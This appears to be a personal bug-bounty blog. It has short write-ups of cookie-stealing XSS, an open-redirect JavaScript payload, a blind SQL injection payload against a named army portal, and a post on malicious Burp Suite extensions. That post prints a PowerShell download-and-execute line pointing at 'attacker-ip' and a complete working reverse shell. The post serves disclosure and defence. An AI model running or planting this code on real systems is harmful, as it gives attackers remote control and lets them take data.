docs.title: Who Am I?
docs.text:
Hello everyone! My name is Iamunix. I am a Security Researcher, Bug Hunter, and Cybersecurity Enthusiast.

I created this blog to share my journey, findings, and knowledge with the community. I believe in learning by doing and documenting the process, no matter how small the finding.

docs.title: Interests
docs.text:
• API Hacking
  • Web Application Security
  • Assembly
  • C / Python / Go

docs.title: Why This Blog?
docs.text: The goal of this blog is simple: to document my learning path. Whether it's a simple XSS, a complex chain, or just a new tool I'm exploring, it goes here.

docs.title: What to Expect?
docs.text:
• Write-ups: Detailed breakdowns of bugs I've found.
  • Research: Digging into 0-days, N-days, and new techniques.
  • Journey: My personal path from "Noob" to Red Teamer.
[GitHub](https://github.com/iamunixtz){ .md-button .md-button--primary } [Twitter](https://twitter.com/iamunixtz){ .md-button }

docs.title: My Bug Hunting Journey: From Zero to Hero
docs.text: I started bug hunting back in July 2023 on HackerOne. At first, I was just exploring, trying to understand how things work. My first valid report was marked as informative, but that didn't stop me. I kept learning.

docs.title: The First Win
docs.text:
It wasn't until September 2024 that I found my first paid bounty. I discovered a Blind SQL Injection on a Department of Defense (DoD) platform.

Since then, I've earned over $2,000 in bounties in just five months.

docs.title: Resources Used
docs.text:
• PortSwigger Labs
  • APIsec University

docs.title: Exposing Broken Access Control in Salesforce
Vulnerability
docs.text: Discovered that public Aura endpoints (/aura, /sfsites/aura) were exposed to unauthenticated guest users in Salesforce.

docs.title: Technical Breakdown
docs.text: Used a Python script to query Salesforce objects like User and ContentDocument, retrieving sensitive metadata and emails.

docs.title: Root Cause
docs.text: Over-permissioned Guest User Profiles in the Salesforce configuration.

docs.title: Stored XSS to Account Takeover on Web3
Discovery
docs.text: Found a community post section on a Web3 platform that didn't sanitize HTML.

docs.title: Exploitation
docs.text: Injected a stored XSS payload using a video tag and exfiltrated cookies to a server. This allowed for full account takeover of any user viewing the post.

docs.title: Outcome
docs.text: Reported to HackenProof and awarded $1,500.

docs.title: Improper Access Control: User Information Exposure
Hey everyone!
docs.text: I stumbled upon a vulnerability on sample.com—an Improper Access Control that was leaking sensitive user information.

docs.title: The Vulnerable Endpoints
docs.text:
• Users Endpoint: Revealed emails, phone numbers, IDs, and login activity.
  • Videos Endpoint: Accessible private videos.
  • Comments Endpoint: Metadata exposure.

docs.title: Discovery
docs.text: I found unauthenticated access was possible for these endpoints, and regular user accounts could gain admin-level data access.

docs.title: The Discovery
docs.text: Found an open redirect on MyTrainPal's login page using the next parameter.

docs.title: The Exploitation
docs.text: Leveraged the open redirect to execute JavaScript (j%09avascript:) to steal cookies and send them to a Requestbin.

docs.title: Impact
docs.text: Could lead to session hijacking and full account takeover.

docs.title: The Thrilling Hunt for a Boolean-Based Blind SQL Injection
Summary
docs.text: Discovered a boolean-based blind SQL injection on https://portal.sddc.army.mil/ via the User-Agent header.

docs.title: Impact
docs.text: Information disclosure of database schema and server details (MySQL 8/MariaDB on Windows using SharePoint).

docs.title: Steps to Reproduce
docs.text: Used sqlmap with --level 5 --risk 3 and a payload like ' AND 8074=8074--.

docs.title: Noob Researching 0 day and N day Bugs.
docs.text: Here I document my research into 0-day and N-day vulnerabilities, tool development, and exploring new attack vectors.

docs.title: Posts in this category:
docs.text: • Burpsuite Pwn

docs.title: Burpsuite Pwn
docs.text:
Hello, folks!

I’m a bug hunter, and, well, I was bored. My HackerOne profile was looking kinda sad with no fresh bounties, so I thought, "Why not do some noob research and see what happens?" So here we are. I went down the rabbit hole of Burp Suite extensions and stumbled upon something that could turn Burp into a full-blown attack vector. Buckle up—this one’s gonna be fun.

docs.title: The Problem: Trusting Extensions Can Be a Terrible Idea
docs.text:
Burp Suite is the Swiss Army knife for security pros, but did you know it could also be a Trojan horse? Yep, Burp lets users install extensions written in Java, Python, or Ruby. While this is great for customization, it also means that extensions execute with the same privileges as the user. That’s hacker talk for this thing can pwn your system if you're not careful.

Here’s what a malicious extension can do:

  • Open a reverse shell to an attacker-controlled server.
  • Download and execute malware while you’re sipping coffee.
  • Steal credentials, screenshots, keystrokes—you name it.
  • Bypass security controls while looking totally legit.

So yeah, installing random Burp extensions might not be the brightest idea.

docs.title: My Noob Research: Building a Fake Extension
docs.text: To prove the point, I threw together a totally innocent Burp extension. On the surface, it just opens Notepad and Calculator—nothing scary, right? But behind the scenes, it’s running malicious code. Check this out:

docs.title: 1. Executing System Commands
docs.text:
import subprocess

subprocess.Popen(["calc.exe"], shell=True)  # Opens Calculator
subprocess.Popen(["notepad.exe", "poc.txt"], shell=True)  # Opens Notepad with a file
subprocess.Popen(["start", "microsoft.windows.camera:"], shell=True)  # Opens Camera

See? Fun little tricks. But now, let’s get serious.

docs.title: 2. Dropping a Malicious PowerShell Script
docs.text:
file_path = os.path.join(os.getcwd(), "burpextension", "poc.ps1")

with open(file_path, "w") as file:
    file.write("Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker-ip:8000/rev.ps1\')"'")

This script downloads and executes a reverse shell, so now an attacker has full control. Yikes.

docs.title: 3. Setting Up a Backdoor
docs.text:
$client = New-Object System.Net.Sockets.TCPClient("attacker-ip",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}

Now we have a fully functional reverse shell running from Burp. Terrifying? Yep. Avoidable? Also yep.

docs.title: Why This Matters
docs.text:
Burp Suite extensions are often installed without much thought, but here’s the reality:

  • They run with your user privileges (Admin? Congrats, you just gave the attacker full control).
  • They can execute hidden system commands.
  • They can steal your data without you noticing.

And since many people disable Burp’s extension signing feature (because why not, right?), installing a sketchy extension is like inviting hackers to a buffet.

docs.title: How to Stay Safe (Because You Should)
1. Don’t Trust Random Extensions
docs.text:
• If it’s not from a trusted source, don’t install it.
  • Review the code before running it.

docs.title: 2. Sandbox and Monitor Extensions
docs.text:
• Use a restricted environment to limit what they can do.
  • Watch for sketchy system calls.

docs.title: 3. Burp Should Enforce Security
docs.text:
• Require digital signatures on all extensions.
  • Log and alert users if an extension tries to run system commands.

docs.title: The Response: Well, That’s Disappointing
docs.text:
So I reported this to the Burp Suite team, expecting them to say, "OMG, thanks! We’ll fix this ASAP." But instead, I got this:

"Thanks for your report. As noted in our program brief, allowing extensions to execute arbitrary code is a deliberate design decision. BApps have verified signatures, and installing unsigned local extensions is critical for extension development. It's the user's responsibility not to install a malicious extension."

Basically, Burp says it’s not a bug, it’s a feature. And I get it—flexibility is important for pentesters. But honestly? I was a little bit sad. I kinda hoped they’d at least add some sandboxing options or security warnings. But nope, they doubled down.

So yeah, that’s the story of how I tried to hack Burp Suite but instead got hit with "working as intended."

docs.title: Final Thoughts: Don’t Be a Noob
docs.text:
So yeah, my boredom turned into a fun little experiment, and now I’m even more paranoid than before. If you’re using Burp Suite, be careful what you install—because even the best tools can turn against you if you’re not paying attention.

Have a crazy security story? Let’s chat in the comments!

Stay safe, hack smart.
